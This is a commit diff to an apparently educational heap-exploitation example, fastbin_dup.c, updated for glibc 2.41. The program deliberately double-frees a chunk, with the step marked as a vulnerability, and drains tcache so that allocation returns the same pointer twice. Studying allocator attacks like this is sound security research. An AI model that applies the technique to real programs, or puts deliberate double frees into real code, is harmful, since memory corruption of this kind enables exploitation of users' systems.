fed6e2dead78af6fced22a3d462c70a8da95da61
Kyle Zeng <zengyhkyle@gmail.com>
2025-08-27 10:38:13 -0700

    fix fastbin_dup-based examples for 2.41

--- glibc_2.41/fastbin_dup.c
+++ glibc_2.41/fastbin_dup.c
@@ -8,25 +8,27 @@ int main()
 
 	printf("This file demonstrates a simple double-free attack with fastbins.\n");
 
-	printf("Fill up tcache first.\n");
-	void *ptrs[8];
-	for (int i=0; i<8; i++) {
-		ptrs[i] = malloc(8);
-	}
+	printf("Allocate buffers to fill up tcache and prep fastbin.\n");
+	void *ptrs[7];
+
 	for (int i=0; i<7; i++) {
-		free(ptrs[i]);
+		ptrs[i] = malloc(8);
 	}
 
 	printf("Allocating 3 buffers.\n");
 	int *a = calloc(1, 8);
 	int *b = calloc(1, 8);
 	int *c = calloc(1, 8);
+	printf("1st malloc(8): %p\n", a);
+	printf("2nd malloc(8): %p\n", b);
+	printf("3rd malloc(8): %p\n", c);
 
-	printf("1st calloc(1, 8): %p\n", a);
-	printf("2nd calloc(1, 8): %p\n", b);
-	printf("3rd calloc(1, 8): %p\n", c);
+	printf("Fill up tcache.\n");
+	for (int i=0; i<7; i++) {
+		free(ptrs[i]);
+	}
 
-	printf("Freeing the first one...\n");
+	printf("Freeing the first chunk %p...\n", a);
 	free(a);
 
 	printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
@@ -36,13 +38,23 @@ int main()
 	free(b);
 
 	printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
+	/* VULNERABILITY */
 	free(a);
+	/* VULNERABILITY */
+
+	printf("In order to use the free list for allocation, we'll need to empty the tcache.\n");
+	printf("This is because since glibc-2.41, we can only reach fastbin by exhausting tcache first.");
+	printf("Because of this patch: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=226e3b0a413673c0d6691a0ae6dd001fe05d21cd");
+	for (int i = 0; i < 7; i++) {
+		ptrs[i] = malloc(8);
+	}
 
 	printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
-	a = calloc(1, 8);
+	puts("Note that since glibc 2.41, malloc and calloc behave the same in terms of the usage of tcache and fastbin, so it doesn't matter whether we use malloc or calloc here.");
+	a = malloc(8);
 	b = calloc(1, 8);
 	c = calloc(1, 8);
-	printf("1st calloc(1, 8): %p\n", a);
+	printf("1st malloc(8): %p\n", a);
 	printf("2nd calloc(1, 8): %p\n", b);
 	printf("3rd calloc(1, 8): %p\n", c);
 
